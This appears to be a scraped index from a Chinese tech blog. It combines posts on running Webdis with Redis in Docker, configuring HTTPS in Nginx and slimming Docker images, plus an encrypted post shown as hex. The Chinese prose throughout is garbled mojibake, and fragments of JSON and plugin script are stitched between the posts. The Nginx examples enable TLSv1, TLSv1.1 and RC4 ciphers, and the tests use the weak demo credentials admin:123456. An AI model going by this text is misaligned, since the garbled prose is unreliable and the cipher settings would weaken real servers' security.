æŸ¥çœ‹å®¹å™¨çš„å¯åŠ¨æƒ…å†µ# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESebd5cac7fee9 clay/webdis:0.1.4 "/bin/sh -c \'/usr/loâ€¦" 14 minutes ago Up 14 minutes 0.0.0.0:7379-&gt;7379/tcp webdis9a1feb971d1c redis:5.0.4-stretch "docker-entrypoint.sâ€¦" 14 minutes ago Up 14 minutes 0.0.0.0:6379-&gt;6379/tcp redis-5.0.4 CURL å‘½ä»¤æµ‹è¯• Webdis ä¸ Redis æ˜¯å¦æ­£å¸¸å·¥ä½œ 1234567891011# å†™å…¥key# curl http://127.0.0.1:7379/SET/hello/world -u admin:123456{"SET":[true,"OK"]}# è·å–key# curl http://127.0.0.1:7379/GET/hello -u admin:123456{"GET":"world"}# åˆ é™¤key# curl http://127.0.0.1:7379/DEL/hello -u admin:123456{"DEL":1} NodeJS ä»£ç æµ‹è¯• Webdis ä¸ Redis æ˜¯å¦æ­£å¸¸å·¥ä½œ 123456789101112131415161718192021222324var request = require(\'request\');var username = "admin";var password = "123456";var url = \'http://127.0.0.1:7379/GET/hello\';var auth = "Basic " + new Buffer(username + ":" + password).toString("base64");request({ url: url, headers: { "Authorization": auth } }, function(error, response, body) { if (error) { console.log(error); return; } if (response.statusCode == 200) { console.log("result: " + body); } else { console.log("code: " + response.statusCode); } }); WebSocket ä¸ Pub/Sub çš„æ”¯æŒ Webdis é»˜è®¤ä¸å¯ç”¨ WebSocket ä¸ Pub/Sub çš„æ”¯æŒï¼Œå¦‚éœ€è¦ç›¸å…³åŠŸèƒ½ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹çš„æ­¥éª¤è¿›è¡Œæ“ä½œã€‚å®˜æ–¹å£°æ˜ Websocket ä¸ Pub/Sub åŠŸèƒ½æ˜¯å®éªŒæ€§çš„ï¼Œç”Ÿäº§ç¯å¢ƒæ…ç”¨ã€‚ç»è¿‡åå¤æµ‹è¯•ï¼ŒæŒ‰ç…§ä¸‹é¢çš„æ­¥éª¤è¿›è¡Œæ“ä½œï¼ŒJavaScript ä»£ç ä¾ç„¶æ— æ³•è¿æ¥ WebSocketã€Pub/Sub æœåŠ¡ï¼Œåç»­å†æƒ³åŠæ³•è§£å†³ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# è¿æ¥ä¸Šé¢åˆ›å»ºçš„webdiså®¹å™¨# docker run -it webdis /bin/bash# è¿›å…¥webdisçš„testsç›®å½•# cd /usr/local/webdis-0.1.4/tests# testsç›®å½•ç»“æ„ä»‹ç»|-- Makefile|-- README.tests|-- basic.py # å•å…ƒæµ‹è¯•è„šæœ¬|-- bench.sh # å‹æµ‹è„šæœ¬|-- limits.py|-- pubsub.c # pub/subæ”¯æŒ|-- websocket.c # websocketæ”¯æŒ`-- websocket.html # websocketçš„html5æµ‹è¯•é¡µé¢# ç¼–è¯‘websocketã€pub/subçš„ä»£ç # make# æŸ¥çœ‹websocketå‘½ä»¤çš„ä½¿ç”¨æ–¹æ³•$ ./websocket -hUsage: ./websocket [options]Options are: -h host (default = "127.0.0.1") -p port (default = 7379) -c threads (default = 4) -n count (number of messages per thread, default = 100000) -v (verbose)# å¯åŠ¨websocketæœåŠ¡ï¼Œå…¶ä¸­127.0.0.1æ˜¯webdisæœåŠ¡çš„IPï¼Œ7379æ˜¯webdisæœåŠ¡çš„ç«¯å£$ ./websocket -h 127.0.0.1 -p 7379 -v# æŸ¥çœ‹pubsubå‘½ä»¤çš„ä½¿ç”¨æ–¹æ³•$ ./pubsub -hUsage: ./pubsub [options]Options are: -h host (default = "127.0.0.1") -p port (default = 7379) -r readers (default = 450) -w writers (default = 10) -c channels (default = 1) -n messages (number of messages to read in total, default = 100000)# å¯åŠ¨pub/subæœåŠ¡ï¼Œå…¶ä¸­127.0.0.1æ˜¯webdisæœåŠ¡çš„IPï¼Œ7379æ˜¯webdisæœåŠ¡çš„ç«¯å£# ç»æµ‹è¯•ï¼Œpub/subæœåŠ¡çš„å¯åŠ¨ä¼šå¯¼è‡´webdisæœåŠ¡æ„å¤–åœæ­¢ï¼ŒåŸå› æš‚æ—¶æœªçŸ¥$ ./pubsub -h 127.0.0.1 -p 7379 JavaScript ä»£ç æµ‹è¯• WebSocket æœåŠ¡ 1234567891011121314function testJSON() { var jsonSocket = new WebSocket("ws://127.0.0.1:7379/.json"); jsonSocket.onopen = function() { console.log("JSON socket connected!"); jsonSocket.send(JSON.stringify(["SET", "hello", "world"])); jsonSocket.send(JSON.stringify(["GET", "hello"])); }; jsonSocket.onmessage = function(messageEvent) { console.log("JSON received:", messageEvent.data); };}testJSON(); JavaScript ä»£ç æµ‹è¯• Pub/Sub æœåŠ¡ 1234567891011121314var previous_response_length = 0xhr = new XMLHttpRequest()xhr.open("GET", "http://127.0.0.1:7379/SUBSCRIBE/hello", true);xhr.onreadystatechange = checkData;xhr.send(null);function checkData() { if(xhr.readyState == 3) { response = xhr.responseText; chunk = response.slice(previous_response_length); previous_response_length = response.length; console.log(chunk); }}; Webdis çš„ SSL æ”¯æŒ Webdis å®˜æ–¹é»˜è®¤ä¸æ”¯æŒ SSLï¼Œå¦‚æœéœ€è¦ SSL çš„æ”¯æŒï¼Œå¯ä»¥ä½¿ç”¨ Nginx ä½œä¸ºåå‘ä»£ç†æœåŠ¡å™¨ï¼Œå³é…ç½® Nginx çš„ä»£ç†ä¸ SSL è¯ä¹¦ï¼Œç„¶åå°†è¯·æ±‚è½¬å‘ç»™ Webdisï¼Œè¿™æ ·å°±å¯ä»¥æé«˜ Webdis è¿æ¥çš„å®‰å…¨æ€§ã€‚Nginx çš„ç¤ºä¾‹é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223server { listen 18379; # Webdisçš„IPä¸ç«¯å£ server_name 172.89.0.3:7379; # SSLè¯ä¹¦ ssl on; ssl_certificate /usr/local/nginx/cert/example.cn.crt; ssl_certificate_key /usr/local/nginx/cert/example.cn.key; # SSLæ€§èƒ½è°ƒä¼˜ ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; location / { # ä»£ç† proxy_pass http://$server_name; }} 12# ä½¿ç”¨CURLå‘½ä»¤æµ‹è¯•Nginxçš„ä»£ç†ä¸SSLé…ç½®æ˜¯å¦æ­£ç¡®ï¼Œå…¶ä¸­example.comæ˜¯ç»‘å®šäº†SSLè¯ä¹¦çš„åŸŸå# curl https://example.com:18379/GET/hello -u admin:123456 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ– ç¼“å­˜"},{title:"3D æ‰“å°å¤‡å¿˜å½•",url:"/posts/d06622f5.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299baa7ecfa933a0cb35661a0afea4caf1af788dd4f62e8eb66ae305f630934e5a372b3b0f7d6553bed8353ebd19956f4e8ad23f696e7967853cc33f6d6ee5b71eaa7c96ca051a6def086e08b46a5872168fa6b5560b18d7d933e854833d7331aee9c96e79b865d1f4ff97deabe5a78e813f8331ca97fb91b9e053f2cb1eb989e4a1d09b46d8a20e893120edcc81d062359f1eea934a5dcb39734cc45f08b7b39874721ddc1970fb17aee30f34d585548f100e30bceb63c5c785a2d15ab5196a7ff6c1df32ba27195f63b965a0631bb7e259acac6bcec1ace74d5d82ecf816cdc7b782562d646edd642a4780fd547c1f5bee93f4f8831fb2ea5d9e5a1d38c93d2dfeeaf87ffe671a4d4a4e51660276bcfe1ccfc883d5dfd3eb9895a011c340719244a4122c78aadf0d1f4b43717cfe67646c639dbf332f39ccce9bebfa4709c0158b54435f3806967617987c50db4203bbe03dde35d6147f56cf81e816de976f64bad2787bb4e2490c6cc04d7c7f3ec36d987d4b9a899f949457ec11825211615e18ad01a4519cec2f10b9b02db2b1107c0ddae5133a2e1b7c27ec62b49c22a8e4171191faabd4a6f609898759d91bca06c7bedf139c0cb12bea46007e03f328794e2a257bfb8a8c0060c43ebde849996ee6cb23cfef2a0566581b918e4ca655e86c286e89424c42da62995bcdd29a919c652b693572386bbeacc1cf61bcb199c11158663943e487525c6e069d80a57c29a13600284233a81daba20e8924d27a2f096f59c3c5eb26b868c285b68e9546fc4876fa74c1961484c22d4a8a8206e1a4dffc068ad65de59878c7b0a64bc1ea727c673b28b8fdb563c61830dd3ddcbb6ea578c52a57ce4ab15259a7ad0817c48aa363f93d1ca510298626ffa590eb63f1075c5f88d09026c17db2aa7a9c499a3e48410330365655887d51524ca40fc0a56bd6af24ff9a2b693faa55cb44de820b17a1e9b8068153fc412a691172d43cfa3b996b5e433650b94d362c43202eed82a2db82e8ccc272783055bad3e6a8170158a2aa44d6cedffb2a94c34011258e06cb8a0cdc3a2e260a3023e44498919c276c7e9658743483371cf847ecfa19949a3aa9c5528156b57830760cbb533b03fb338100d6bb22bc13e7860272a20e739c09266891a0da06c0af0faad1947becae0b32df2643f74dd3052ea2b6d972ccbce9c7b9c6183ba2b5b04e97d23cb37dc43c834f4894664b557e6705bff04df2122a8bbcdd20c0df5474d54a23cb3311b9f2bdddaf885fd670a9b8a5062ce5fda48fcd03fa235853e9dbddf94879e62a1c7bcf6c3eda212ac5a193cd4f576b12c4f2824df69dcd202a95bb9087c68bc74bb0b5c1c561f61a0344acd648bf650e1296acd9ef0bbf3318224d7d5c4fc12e41823e04ecbac3a774bdc36c08dc1e2b95e4d03a586591b2dd892f67388349d04c123b2e625cdfa7b563308293d818686052c719b857f128382120933294735af04543a18e71f6d46664ce21810c8dcaa237dcb24802882cd89a06751b3792d10169869d207c6085f434c6923a354b12a75322ed4ed0f62dc8a54e3e106924a476e56743561abf558f317a5ac7737a6080794cb847bac66365590171941d28da2bfb1978b627a555d07e6f444abd5fc364578a7c6f26a85b687c6ee571dba530f76b91e95ae67f0936f31de646a120861471cd2795dd7ba92ea357eafcb630d074b6d77ddde226788874dec26e4c468d9fce1a799eb738fafb54a2c5f2aef57903323e84a746c4bbb4a49e2e66140dc08a04771c022e4d0a051c97d056ec7aad4ab55385d385395cd4e5d0f755f07ac77785703925a895ff766577ca1bde5d0100517cb38b55e1f1f4b7d572c5db6c3b6a852ef7edb630fb211b5735070f7404e8d057c60352c4c6b00682b956638c7f26cc955080b8c8cc041d8c10f38719c442d80b7994c873038ffafa21f3bd8d791303bccf31ca34d20e4c8657d5229e1915b223ec7f0915eab06816d61ac28943b9de3a31b2f7633fb3c0f3744600be7f0015688b93242e0447d4063243cffec68fc6071651df4df6e06d25be0a2cb818fcd4c2599877b719407dda110b8b3289e0d4c1d96ed1dc086e1953bda7bda1c166e1cdb95fb00dba380bc256afe0afb7ffd15d971c1597864bc4016c680be87b196029e67a7800ddb62cda3a416ab134dd048101c54eef0300a3b5ddbb7b4d231a3f è¯· è¾“ å…¥ é˜… è¯» å¯† ç .",tags:"åŠ å¯†åšå®¢"},{title:"Nginx é…ç½® Https",url:"/posts/d65a2736.html",text:'ç³»ç»Ÿç¯å¢ƒ 12CentOS Linux release 7.6.1810 (Core)Linux 3.10.0-957.12.2.el7.x86_64 #1 SMP Tue May 14 21:24:32 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux ç³»ç»Ÿå®‰è£… OpenSSL 12345# æ›´æ–°ç³»ç»Ÿ# yum update# å®‰è£…openssl# yum install openssl openssl-devel Nginx å®‰è£… SSL æ¨¡å— 1234567891011121314# é…ç½®ç¼–è¯‘# ./configure \\ --user=nginx \\ --group=nginx \\ --prefix=/usr/local/nginx \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_concat_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module \\ --with-http_upstream_consistent_hash_module# ç¼–è¯‘å®‰è£…ï¼Œä¼šè¦†ç›–å·²å®‰è£…çš„Nginx# make &amp;&amp; make install Nginx é…ç½® SSL è¯ä¹¦ä¸ SSL æ€§èƒ½è°ƒä¼˜ 123456789101112131415161718server { listen 443; server_name www.example.cn; # SSLè¯ä¹¦ ssl on; ssl_certificate /usr/local/nginx/cert/example.cn.crt; ssl_certificate_key /usr/local/nginx/cert/example.cn.key; # SSLæ€§èƒ½è°ƒä¼˜ ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; ...ï¼ˆçœç•¥ï¼‰} Nginx é…ç½® Http è·³è½¬ Https 123456789101112131415161718192021222324252627# ç¬¬ä¸€ç§å†™æ³•server { listen 80; server_name www.example.cn; rewrite ^(.*) https://$server_name$1 permanent;}# ç¬¬äºŒç§å†™æ³•ï¼Œå°†httpçš„urlé€šè¿‡301çŠ¶æ€ç é‡å®šå‘åˆ°httpsçš„urlä¸Šserver { listen 80; server_name www.example.cn; return 301 https://$server_name$request_uri;}server { listen 443; server_name www.example.cn; # SSLæ€§èƒ½è°ƒä¼˜ ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; ...ï¼ˆçœç•¥ï¼‰} Nginx é…ç½®æ”¯æŒåŒæ—¶è®¿é—® 80 å’Œ 443 ç«¯å£ 1234567891011121314151617181920212223server { listen 80; listen 443 ssl; server_name www.example.cn; if ($server_port !~ 443){ rewrite ^(/.*)$ https://$host$1 permanent; } # SSLè¯ä¹¦ # ssl on; # æ³¨é‡Šæ‰ ssl_certificate /usr/local/nginx/cert/example.cn.crt; ssl_certificate_key /usr/local/nginx/cert/example.cn.key; # SSLæ€§èƒ½è°ƒä¼˜ ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; ...ï¼ˆçœç•¥ï¼‰} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"webæœåŠ¡å™¨"},{title:"Docker ä¹‹åå…«é•œåƒç˜¦èº«",url:"/posts/4880517.html",text:'ç¼“å­˜ Docker çš„ä¼˜ç‚¹ä¹‹ä¸€æ˜¯æä¾›ç¼“å­˜ï¼Œå¸®åŠ©ä½ æ›´å¿«åœ°è¿­ä»£é•œåƒæ„å»ºã€‚åœ¨æ„å»ºæ˜ åƒæ—¶ï¼ŒDocker æŒ‰æ­¥éª¤éå† Dockerfile ä¸­çš„æŒ‡ä»¤ï¼ŒæŒ‰é¡ºåºæ‰§è¡Œæ¯ä¸ªæŒ‡ä»¤ã€‚åœ¨æ£€æŸ¥æ¯ä¸ªæŒ‡ä»¤æ—¶ï¼ŒDocker ä¼šåœ¨å…¶ç¼“å­˜ä¸­å¯»æ‰¾ä¸€ä¸ªå¯ä»¥é‡ç”¨çš„ç°æœ‰ä¸­é—´é•œåƒï¼Œè€Œä¸æ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„ (é‡å¤çš„) ä¸­é—´é•œåƒã€‚å¦‚æœç¼“å­˜æ— æ•ˆï¼Œè®©æ— æ•ˆçš„æŒ‡ä»¤å’Œæ‰€æœ‰åç»­ Dockerfile æŒ‡ä»¤ç”Ÿæˆæ–°çš„ä¸­é—´é•œåƒã€‚å› æ­¤ï¼Œä» Dockerfile çš„é¡¶éƒ¨å¼€å§‹ï¼Œå¦‚æœåŸºç¡€é•œåƒå·²ç»åœ¨ç¼“å­˜ä¸­ï¼Œé‚£ä¹ˆå®ƒå°†è¢«é‡ç”¨ã€‚ç„¶åå°†ä¸‹ä¸€æ¡æŒ‡ä»¤ä¸ä»è¯¥åŸºç¡€é•œåƒæ´¾ç”Ÿçš„ç¼“å­˜ä¸­çš„æ‰€æœ‰å­é•œåƒè¿›è¡Œæ¯”è¾ƒã€‚æ¯”è¾ƒæ¯ä¸ªç¼“å­˜çš„ä¸­é—´é•œåƒï¼Œçœ‹æŒ‡ä»¤æ˜¯å¦åœ¨ç¼“å­˜å‘½ä¸­ã€‚å¦‚æœç¼“å­˜å¤±è´¥ï¼Œåˆ™ç¼“å­˜æ— æ•ˆã€‚é‡å¤ç›¸åŒçš„è¿‡ç¨‹ï¼Œç›´åˆ°åˆ°è¾¾ Dockerfile çš„æœ«å°¾ã€‚ ç¼“å­˜é™·é˜± å¤§å¤šæ•°æ–°æŒ‡ä»¤åªæ˜¯ç®€å•åœ°ä¸ä¸­é—´é•œåƒä¸­çš„æŒ‡ä»¤è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœåŒ¹é…ï¼Œåˆ™ä½¿ç”¨ç¼“å­˜çš„å‰¯æœ¬ã€‚ä¾‹å¦‚ï¼Œå½“åœ¨ Dockerfile ä¸­æ‰¾åˆ° RUN pip install -r requiremtes .txt æŒ‡ä»¤æ—¶ï¼ŒDocker ä¼šåœ¨æœ¬åœ°ç¼“å­˜çš„ä¸­é—´é•œåƒä¸­æœç´¢ç›¸åŒçš„æŒ‡ä»¤ã€‚ä¸æ¯”è¾ƒæ–°æ—§ requirements.txt æ–‡ä»¶çš„å†…å®¹ã€‚å¦‚æœä½¿ç”¨æ–°åŒ…æ¥æ›´æ–° requirements.txt æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ RUN pip install å¹¶å¸Œæœ›ä½¿ç”¨æ–°åŒ…åç§°é‡æ–°è¿è¡ŒåŒ…å®‰è£…ï¼Œåˆ™æ­¤è¡Œä¸ºå¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚åç»­ä¼šå±•ç¤ºä¸€äº›è§£å†³æ–¹æ¡ˆã€‚ä¸å…¶ä»– Docker æŒ‡ä»¤ä¸åŒï¼ŒADD å’Œ COPY æŒ‡ä»¤ç¡®å®éœ€è¦ Docker æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ï¼Œä»¥ç¡®å®šæ˜¯å¦å­˜åœ¨ç¼“å­˜å‘½ä¸­ã€‚å°†å¼•ç”¨æ–‡ä»¶çš„æ ¡éªŒå’Œä¸ç°æœ‰ä¸­é—´é•œåƒä¸­çš„æ ¡éªŒå’Œè¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæ–‡ä»¶å†…å®¹æˆ–å…ƒæ•°æ®å‘ç”Ÿäº†æ›´æ”¹ï¼Œåˆ™ç¼“å­˜æ— æ•ˆã€‚ æœ‰æ•ˆä½¿ç”¨ç¼“å­˜çš„æŠ€å·§ å¯ä»¥é€šè¿‡ä¼ é€’ â€“no-cache=True ç»™ docker build å…³é—­ç¼“å­˜ã€‚ å¦‚æœä½ è¦å¯¹æŒ‡ä»¤è¿›è¡Œæ›´æ”¹ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„æ¯ä¸€å±‚éƒ½å°†é¢‘ç¹åœ°é‡æ–°æ„å»ºã€‚è¦åˆ©ç”¨ç¼“å­˜ï¼Œè¯·åœ¨ Dockerfile ä¸­å°½å¯èƒ½é åæ”¾ç½®å¯èƒ½æ›´æ”¹çš„æŒ‡ä»¤ã€‚ åˆå¹¶ RUN apt-get update å’Œ apt-get install å‘½ä»¤ï¼Œä»¥é¿å…ç¼“å­˜ä¸¢å¤±é—®é¢˜ã€‚ å¦‚æœä½ æ­£åœ¨ä½¿ç”¨å¸¦æœ‰ requirements.txt æ–‡ä»¶çš„åŒ…å®‰è£…ç¨‹åº (å¦‚ pip)ï¼Œé‚£ä¹ˆè¯·éµå¾ªå¦‚ä¸‹æ¨¡å‹ï¼Œä»¥ç¡®ä¿ä½ ä¸ä¼šæ”¶åˆ°å¸¦æœ‰ requirements.txt ä¸­åˆ—å‡ºçš„æ—§åŒ…çš„é™ˆæ—§çš„ä¸­é—´é•œåƒã€‚123COPY requirements.txt /tmp/RUN pip install -r /tmp/requirements.txtCOPY . /tmp/ å‡å°‘é•œåƒä½“ç§¯ Docker é•œåƒå¯èƒ½ä¼šå˜å¾—å¾ˆå¤§ï¼Œè®©å®ƒä»¬çš„ä½“ç§¯å˜å°ï¼Œè¿™æ ·å®ƒä»¬å°±å¯ä»¥å¿«é€Ÿæ‹‰èµ·ï¼Œä½¿ç”¨å¾ˆå°‘çš„èµ„æºã€‚Alpine Base é•œåƒæ˜¯ä¸€ä¸ªå®Œæ•´çš„ Linux å‘è¡Œç‰ˆï¼Œæ²¡æœ‰å¤ªå¤šå…¶ä»–ä¸œè¥¿ã€‚ä¸‹è½½é€šå¸¸å°äº 5mbï¼Œä½†æ˜¯å®ƒéœ€è¦æ›´å¤šçš„æ—¶é—´ä¸ºæ„å»ºåº”ç”¨ç¨‹åºæ‰€éœ€çš„ä¾èµ–é¡¹ç¼–å†™ä»£ç ã€‚å¦‚æœä½ çš„å®¹å™¨ä¸­éœ€è¦ Python, Python Alpine æ„å»ºæ˜¯ä¸€ä¸ªä¸é”™çš„æŠ˜è¡·æ–¹æ¡ˆã€‚å®ƒåŒ…å« Linux å’Œ Pythonï¼Œä½ å¯ä»¥æä¾›å¤§å¤šæ•°å…¶ä»–ä¸œè¥¿ã€‚ç”¨æœ€æ–°çš„ Python Alpine æ„å»ºçš„å¸¦æœ‰æ‰“å°è„šæœ¬ (â€œhello worldâ€) çš„é•œåƒå¤§å°ä¸º 78.5 MBã€‚Dockerfile å¦‚ä¸‹ï¼š 123FROM python:3.7.2-alpine3.8COPY . /appENTRYPOINT [â€œpythonâ€, â€œ./app/my_script.pyâ€, â€œmy_varâ€] å¤šçº§æ„å»ºé•œåƒ åœ¨ Docker Hub ä¸Šï¼ŒåŸºç¡€é•œåƒçš„å¤§å°ä¸º 29MBï¼Œå½“æ„å»ºå­é•œåƒæ—¶ï¼Œéœ€è¦ä¸‹è½½å¹¶å®‰è£… Pythonï¼Œæ­¤æ—¶ä½“ç§¯å°±å˜å¾—å¾ˆå¤§ã€‚é™¤äº†ä½¿ç”¨ Alpine åŸºç¡€é•œåƒï¼Œå¦ä¸€ç§å‡å°é•œåƒå¤§å°çš„æ–¹æ³•æ˜¯ä½¿ç”¨å¤šçº§æ„å»ºã€‚ä½†è¿™ç§æŠ€æœ¯è¿˜ä¼šå¢åŠ  Dockerfile çš„å¤æ‚æ€§ã€‚å¤šçº§æ„å»ºä¸€èˆ¬ä½¿ç”¨å¤šä¸ª FROM æŒ‡ä»¤ï¼Œå¯ä»¥æœ‰é€‰æ‹©åœ°å°†æ–‡ä»¶ (ç§°ä¸ºæ„å»ºå·¥ä»¶) ä»ä¸€ä¸ªé˜¶æ®µå¤åˆ¶åˆ°å¦ä¸€ä¸ªé˜¶æ®µã€‚ä½ å¯ä»¥åœ¨æœ€ç»ˆçš„é•œåƒä¸­æ‰”æ‰ä»»ä½•ä½ ä¸æƒ³è¦çš„ä¸œè¥¿ã€‚è¿™ç§æ–¹æ³•å¯ä»¥å‡å°‘é•œåƒæ•´ä½“çš„ä½“ç§¯ã€‚å…·ä½“æ„å»ºæµç¨‹å¦‚ä¸‹ï¼š æ¯ä¸ª FROM æŒ‡ä»¤ å¼€å§‹æ„å»ºçš„æ–°é˜¶æ®µ å»æ‰åœ¨ä¹‹å‰é˜¶æ®µç•™ä¸‹çš„ä»»ä½•çŠ¶æ€ å¯ä»¥ç”¨ä¸åŒçš„åŸºç¡€é•œåƒ 12345678910FROM golang:1.7.3 AS buildWORKDIR /go/src/github.com/alexellis/href-counter/RUN go get -d -v golang.org/x/net/htmlCOPY app.go .RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .FROM alpine:latestRUN apk --no-cache add ca-certificatesWORKDIR /root/COPY --from=build /go/src/github.com/alexellis/href-counter/app .CMD ["./app"] ä¸Šé¢æ˜¯ DockerFile ä¸­ç»è¿‡ä¿®æ”¹çš„å¤šçº§æ„å»ºç¤ºä¾‹ï¼Œé€šè¿‡ç»™ FROM æŒ‡ä»¤å¢åŠ ä¸€ä¸ªåå­—æ¥å‘½åç¬¬ä¸€é˜¶æ®µã€‚ç„¶åè¢«å‘½åçš„é˜¶æ®µä¼šé€šè¿‡ COPY â€“from= æŒ‡ä»¤å¼•ç”¨åˆ° Dockerfile ä¸­ã€‚åœ¨åˆ¶é€ å¤§é‡å®¹å™¨çš„æƒ…å†µä¸‹ï¼Œå¤šçº§æ„å»ºæ˜¯æœ‰æ„ä¹‰çš„ã€‚å¤šçº§æ„å»ºå¯ä»¥å¸®åŠ©ä½ ä»é•œåƒå¤§å°ä¸­æŒ¤å‡ºæ¯ä¸€å¯¸ç©ºé—´ã€‚ç„¶è€Œæœ‰æ—¶å¤šé˜¶æ®µæ„å»ºä¼šå¢åŠ å¤æ‚æ€§ï¼Œä½¿é•œåƒæ›´éš¾ç»´æŠ¤ï¼Œå› æ­¤ä½ å¯èƒ½ä¸ä¼šåœ¨å¤§å¤šæ•°æ„å»ºä¸­ä½¿ç”¨å®ƒä»¬ã€‚ ä½¿ç”¨ .dockerignore æ–‡ä»¶ å»ºè®®ä½¿ç”¨ .dockerignore æ–‡ä»¶æ¥å¸®åŠ©ä¿æŒ Docker é•œåƒçš„ç®€æ´ã€‚.dockerignore ç±»ä¼¼äº.gitignoreï¼Œå®ƒæ˜¯ä¸€ä¸ªåŒ…å« Docker æ¨¡å¼åˆ—è¡¨çš„æ–‡ä»¶ï¼ŒDocker åœ¨ç”Ÿæˆé•œåƒæ—¶éœ€è¦åŒ¹é…æ–‡ä»¶åå¹¶æ’é™¤è¿™äº›æ¨¡å¼ã€‚å°†.dockerignore æ–‡ä»¶ä¸ Dockerfile å’Œæ„å»ºä¸Šä¸‹æ–‡çš„å…¶ä½™éƒ¨åˆ†æ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­ã€‚è¿è¡Œ docker build åˆ›å»ºé•œåƒæ—¶ï¼ŒDocker ä¼šæ£€æŸ¥ .dockerignore æ–‡ä»¶ã€‚å¦‚æœæ‰¾åˆ°åˆ™é€è¡Œæ£€æŸ¥æ–‡ä»¶å¹¶ä½¿ç”¨ Go çš„ filepath åŒ¹é…è§„åˆ™å’Œ Docker è‡ªå·±çš„ä¸€äº›è§„åˆ™æ¥åŒ¹é…æ–‡ä»¶åä»¥è¿›è¡Œæ’é™¤ã€‚æƒ³æƒ³ unix é£æ ¼çš„ glob æ¨¡å¼ï¼Œè€Œä¸æ˜¯æ­£åˆ™è¡¨è¾¾å¼ã€‚å› æ­¤ *.jpg å°†æ’é™¤æ‰©å±•åä¸º .jpg çš„æ–‡ä»¶ã€‚å¯ä»¥ä½¿ç”¨ä»¥ # å¼€å¤´çš„æ³¨é‡Šæ¥è§£é‡Šåœ¨ .dockerignore ä¸­æ‰€åšçš„äº‹æƒ…ã€‚ ä½¿ç”¨ .dockerignore æ–‡ä»¶çš„å¥½å¤„ å¸®åŠ©ä½ ä¿å®ˆç§˜å¯†ã€‚æ²¡æœ‰äººæƒ³åœ¨é•œåƒä¸­ä½¿ç”¨å¯†ç ã€‚ å‡å°‘é•œåƒå¤§å°ã€‚æ›´å°‘çš„æ–‡ä»¶æ„å‘³ç€æ›´å°ã€æ›´å¿«çš„é•œåƒã€‚ å‡å°‘æ„å»ºç¼“å­˜å¤±æ•ˆã€‚å¦‚æœæ—¥å¿—æˆ–å…¶ä»–æ–‡ä»¶æ­£åœ¨å‘ç”Ÿå˜åŒ–ï¼Œè€Œä½ çš„é•œåƒç¼“å­˜å› æ­¤è€Œå¤±æ•ˆï¼Œåˆ™ä¼šå‡æ…¢æ„å»ºå‘¨æœŸã€‚ é•œåƒä½“ç§¯æ£€æŸ¥ å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¡Œæ‰¾åˆ° Docker é•œåƒå’Œå®¹å™¨çš„å¤§å° è¦æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨çš„å¤§è‡´å¤§å°ï¼Œå¯ä»¥ä½¿ç”¨ docker container ls -s å‘½ä»¤ã€‚ è¿è¡Œ docker image ls 